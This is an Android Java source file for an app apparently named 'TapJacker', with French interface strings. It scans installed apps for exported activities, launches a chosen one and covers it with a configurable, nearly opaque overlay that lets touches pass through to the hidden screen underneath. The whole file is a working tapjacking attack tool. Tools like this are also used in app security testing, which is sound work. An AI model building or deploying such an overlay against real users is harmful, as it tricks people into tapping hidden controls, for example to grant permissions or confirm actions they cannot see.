package com.zed.tapjacker;

import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.content.pm.ResolveInfo;
import android.graphics.PixelFormat;
import android.graphics.drawable.ColorDrawable;
import android.net.Uri;
import android.os.Build;
import android.content.pm.PackageInfo;
import android.content.pm.ActivityInfo;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.Editable;
import android.text.TextUtils;
import android.text.TextWatcher;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;


import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private EditText delayField;
    private EditText searchField;
    private EditText editExportedActivity;
    private EditText editCustomText;
    private Spinner packagesDropDown;
    private Button buttonColorPicker;
    private CheckBox checkboxShowLogo;
    private String[] packagesArr;
    private List<String> allPackagesList = new ArrayList<>();

    private static final int REQUEST_CODE_OVERLAY_PERMISSION = 1001;
    private WindowManager windowManager;
    private View overlayView;
    private boolean isOverlayShowing = false;
    private Handler handler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        delayField = findViewById(R.id.delayField);
        searchField = findViewById(R.id.searchField);
        packagesDropDown = findViewById(R.id.packagesDropDown);
        buttonColorPicker = findViewById(R.id.buttonColorPicker);
        editExportedActivity = findViewById(R.id.editExportedActivity);
        editCustomText = findViewById(R.id.editCustomText);
        checkboxShowLogo = findViewById(R.id.checkboxShowLogo);

        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);

        // Couleur par défaut
        buttonColorPicker.setBackgroundColor(Color.parseColor("#CC000000"));
        
        buttonColorPicker.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showColorPickerDialog();
            }
        });

        searchField.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {}

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
                filterPackages(s.toString());
            }

            @Override
            public void afterTextChanged(Editable s) {}
        });

        configureDropDown();
        loadPackages();
        checkOverlayPermission();
    }

    private void showColorPickerDialog() {
        final String[] colors = {"Noir", "Rouge", "Vert", "Bleu", "Jaune", "Gris", "Transparent"};
        final int[] colorValues = {
                Color.parseColor("#CC000000"), // Noir
                Color.parseColor("#CCFF0000"), // Rouge
                Color.parseColor("#CC00FF00"), // Vert
                Color.parseColor("#CC0000FF"), // Bleu
                Color.parseColor("#CCFFFF00"), // Jaune
                Color.parseColor("#CC888888"), // Gris
                Color.parseColor("#22000000")  // Presque transparent
        };

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Choisir une couleur d'overlay");
        builder.setItems(colors, new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                buttonColorPicker.setBackgroundColor(colorValues[which]);
                Toast.makeText(MainActivity.this, "Couleur sélectionnée : " + colors[which], Toast.LENGTH_SHORT).show();
            }
        });
        builder.show();
    }

    private void filterPackages(String query) {
        List<String> filteredList = new ArrayList<>();
        for (String pkg : allPackagesList) {
            if (pkg.toLowerCase().contains(query.toLowerCase())) {
                filteredList.add(pkg);
            }
        }

        packagesArr = filteredList.toArray(new String[0]);

        ArrayAdapter<String> adapter = new ArrayAdapter<>(
                this,
                android.R.layout.simple_spinner_dropdown_item,
                packagesArr
        );

        packagesDropDown.setAdapter(adapter);
    }

    private void checkOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_CODE_OVERLAY_PERMISSION);
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_OVERLAY_PERMISSION) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!Settings.canDrawOverlays(this)) {
                    Toast.makeText(this, "Permission requise pour l'overlay", Toast.LENGTH_LONG).show();
                }
            }
        }
    }

    private void configureDropDown() {
        packagesDropDown.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                String entry = packagesArr[position];
                if(entry.contains("/")) {
                    setStartActivity(entry.split("/")[1]);
                } else {
                    Intent launchIntent = getPackageManager().getLaunchIntentForPackage(entry);
                    if (launchIntent != null && launchIntent.getComponent() != null) {
                        setStartActivity(launchIntent.getComponent().getClassName());
                    }
                }
            }
            @Override
            public void onNothingSelected(AdapterView<?> parent) {}
        });
    }

    private void setStartActivity(String name) {
        editExportedActivity.setText(name);
    }

    public void runTapJacker(View view) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            checkOverlayPermission();
            return;
        }

        String delayText = delayField.getText().toString();
        if (TextUtils.isEmpty(delayText)) {
            Toast.makeText(this, "Set delay first", Toast.LENGTH_SHORT).show();
            return;
        }

        final int delay = Integer.parseInt(delayText);
        Object selected = packagesDropDown.getSelectedItem();
        if (selected == null) return;

        String selectedEntry = selected.toString();
        final String packageName = selectedEntry.contains("/") ? selectedEntry.split("/")[0] : selectedEntry;
        final String activityName = editExportedActivity.getText().toString();

        if (delay < 3) {
            Toast.makeText(this, "Delay should be 3s+", Toast.LENGTH_SHORT).show();
            return;
        }

        showPersistentOverlay();

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                launchExportedActivity(packageName, activityName);
            }
        }, 500);

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                hideOverlay();
            }
        }, delay * 1000);
    }

    private void showPersistentOverlay() {
        if (isOverlayShowing) return;

        try {
            LayoutInflater inflater = (LayoutInflater) getSystemService(LAYOUT_INFLATER_SERVICE);
            overlayView = inflater.inflate(R.layout.tapjacker_overlay, null);
            configureOverlayElements(overlayView);

            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                    WindowManager.LayoutParams.TYPE_PHONE;

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    type,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | 
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    PixelFormat.TRANSLUCENT
            );

            params.gravity = Gravity.TOP;
            params.alpha = 0.95f;

            windowManager.addView(overlayView, params);
            isOverlayShowing = true;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void hideOverlay() {
        if (overlayView != null && isOverlayShowing) {
            try {
                windowManager.removeView(overlayView);
                isOverlayShowing = false;
            } catch (Exception e) {}
        }
    }

    void launchExportedActivity(String packageName, String activityName) {
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(packageName, activityName));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            Toast.makeText(this, "Lancement impossible: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void configureOverlayElements(View overlayView) {
        int color = Color.BLACK;
        if (buttonColorPicker.getBackground() instanceof ColorDrawable) {
            color = ((ColorDrawable) buttonColorPicker.getBackground()).getColor();
        }

        TextView tv = overlayView.findViewById(R.id.overlayText);
        ImageView iv = overlayView.findViewById(R.id.overlayImage);

        tv.setTextColor(color);
        iv.setColorFilter(color);

        String custom = editCustomText.getText().toString();
        tv.setText(TextUtils.isEmpty(custom) ? getString(R.string.overlay_message) : custom);
        iv.setVisibility(checkboxShowLogo.isChecked() ? View.VISIBLE : View.INVISIBLE);
    }

    private void loadPackages() {
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(0);
        allPackagesList.clear();
        for (ApplicationInfo app : apps) {
            if (!app.packageName.equals(getPackageName())) allPackagesList.add(app.packageName);
        }
        filterPackages(searchField.getText().toString());
    }

    public void scanExportedActivities(View view) {
        PackageManager pm = getPackageManager();
        List<String> results = new ArrayList<>();
        try {
            List<ApplicationInfo> apps = pm.getInstalledApplications(0);
            for (ApplicationInfo app : apps) {
                PackageInfo pi = pm.getPackageInfo(app.packageName, PackageManager.GET_ACTIVITIES);
                if (pi.activities != null) {
                    for (ActivityInfo ai : pi.activities) {
                        if (ai.exported) results.add(ai.packageName + "/" + ai.name);
                    }
                }
            }
        } catch (Exception e) {}

        if(results.isEmpty()) return;
        allPackagesList.clear();
        allPackagesList.addAll(results);
        filterPackages(searchField.getText().toString());
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        hideOverlay();
    }
}